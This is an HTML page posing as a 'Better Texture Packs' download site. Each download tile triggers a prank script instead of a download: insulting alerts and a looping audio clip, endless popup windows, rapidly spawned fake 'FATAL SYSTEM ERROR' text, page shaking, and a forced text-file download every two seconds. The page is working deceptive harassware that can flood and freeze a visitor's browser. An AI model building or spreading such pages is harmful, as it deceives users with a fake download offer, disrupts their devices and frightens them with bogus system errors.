<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Better Texture Packs</title>
    <style>
        body {
            background: url('https://iili.io/2LnOhhX.png') no-repeat center center fixed;
            background-size: cover;
            text-align: center;
            font-family: Arial, sans-serif;
            color: white;
            overflow: hidden;
            transition: all 0.1s;
        }
        .content {
            margin-top: 50px;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            width: 80%;
            max-width: 900px;
            display: inline-block;
        }
        h1 {
            font-size: 32px;
        }
        .pack {
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            padding: 10px;
            cursor: pointer;
            font-weight: bold;
            color: white;
            transition: background-color 0.3s;
        }
        .pack:hover {
            background-color: rgba(255, 255, 255, 0.5);
        }
        .pack img {
            width: 100%;
            max-height: 200px;
            border-radius: 10px;
        }
        .pack-title {
            margin-top: 10px;
        }
        .download-link {
            display: inline-block;
            margin-top: 10px;
            color: white;
            background-color: #007BFF;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
        }
        .download-link:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <audio id="trollSound" src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" preload="auto" loop></audio>
    
    <div class="content">
        <h1>Welcome to the Better Texture Packs</h1>
        <div class="pack" onclick="troll()">
            <img src="https://iili.io/2Lowp7p.png" alt="Fixed Bowls">
            <div class="pack-title">Fixed Bowls</div>
            <a class="download-link" href="#">Download</a>
        </div>
        <div class="pack" onclick="troll()">
            <img src="https://iili.io/2L5ZfCN.png" alt="Smoother Cornbread">
            <div class="pack-title">Smoother Cornbread</div>
            <a class="download-link" href="#">Download</a>
        </div>
        <div class="pack" onclick="troll()">
            <img src="https://iili.io/3CiFphx.png" alt="Better Helmets">
            <div class="pack-title">Better Helmets</div>
            <a class="download-link" href="#">Download</a>
        </div>
    </div>
    
    <script>
        function troll() {
            alert("YOU ARE AN IDIOT! AHAHAHAAAAA");
            document.getElementById("trollSound").play();
            
            setInterval(() => {
                window.open("https://iili.io/2LnOhhX.png", "", "width=400, height=300");
            }, 500);
            
            setInterval(() => {
                let trollDiv = document.createElement("div");
                trollDiv.classList.add("troll-window");
                trollDiv.innerText = ["ERROR 404!", "YOU ARE DOOMED!", "HAHAHAHA!", "NO ESCAPE!", "FATAL SYSTEM ERROR!", "CRITICAL MALFUNCTION!", "INFINITE CHAOS!", "TROLLED!"][Math.floor(Math.random() * 8)];
                trollDiv.style.top = Math.random() * window.innerHeight + "px";
                trollDiv.style.left = Math.random() * window.innerWidth + "px";
                document.body.appendChild(trollDiv);
            }, 50);
            
            setInterval(() => {
                let glitch = document.createElement("div");
                glitch.style.position = "absolute";
                glitch.style.top = Math.random() * window.innerHeight + "px";
                glitch.style.left = Math.random() * window.innerWidth + "px";
                glitch.style.color = "lime";
                glitch.style.fontSize = "30px";
                glitch.innerText = "YOU ARE AN IDIOT!";
                document.body.appendChild(glitch);
            }, 30);
            
            setInterval(() => {
                document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg) scale(${1 + Math.random() * 0.1}) translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
            }, 100);
            
            setInterval(() => {
                let textFile = new Blob(["YOU ARE AN IDIOT! AHAHAHAAAAA"], { type: "text/plain" });
                let downloadLink = document.createElement("a");
                downloadLink.href = URL.createObjectURL(textFile);
                downloadLink.download = "trolled.txt";
                document.body.appendChild(downloadLink);
                downloadLink.click();
                document.body.removeChild(downloadLink);
            }, 2000);
        }
        
        window.onload = function() {
            // nothing happens until user clicks on download
        };
    </script>
</body>
</html>
